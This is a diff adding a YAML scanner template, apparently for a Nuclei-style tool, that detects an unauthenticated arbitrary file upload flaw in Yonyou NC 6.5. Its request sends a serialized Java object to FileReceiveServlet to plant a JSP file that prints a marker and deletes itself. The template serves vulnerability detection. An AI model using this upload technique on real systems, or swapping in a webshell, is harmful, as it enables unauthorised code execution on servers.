@@ -1,0 +1,42 @@
+id: YonyouNc-Arbitrary-FileUpload
+info:
+  name: 用友NC任意文件上传漏洞
+  author:
+  - l0ne1y
+  description: |-
+    用友NC任意文件上传漏洞
+    用友NC6.5的某个页面，存在任意文件上传漏洞。漏洞成因在于上传文件处未作类型限制，未经身份验证的攻击者可通过向目标系统发送特制数据包来利用此漏洞，成功利用此漏洞的远程攻击者可在目标系统上传任意文件执行命令。
+  severity: high
+  remediation: |-
+    #### 官方修复方案：
+    升级系统至无漏洞版本，或于官网下载安全补丁。
+requests:
+- matchers:
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/servlet/FileReceiveServlet'
+  method: POST
+  body: '{{random3}}{{fileName}}{{random4}}<%out.print({{randomValue}});new java.io.File(application.getRealPath(request.getServletPath())).delete();%>'
+  headers:
+    Content-Type: multipart/form-data;
+- matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    words:
+    - '{{randomValue}}'
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/{{fileName}}.jsp'
+  method: GET
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+variables:
+  fileName: '{{rand_base(5, "qwertyuiopasdfghjkl")}}'
+  random3: "¬í\0\x05sr\0\x11java.util.HashMap\x05\aÚÁÃ\x16`Ñ\x03\0\x02F\0\nloadFactorI\0\tthresholdxp?@\0\0\0\0\0\fw\b\0\0\0\x10\0\0\0\x02t\0\tFILE_NAMEt\0\t"
+  random4: ".jspt\0\x10TARGET_FILE_PATHt\0\x10./webapps/nc_webx"
+  randomValue: '{{rand_int(200000000, 210000000)}}'
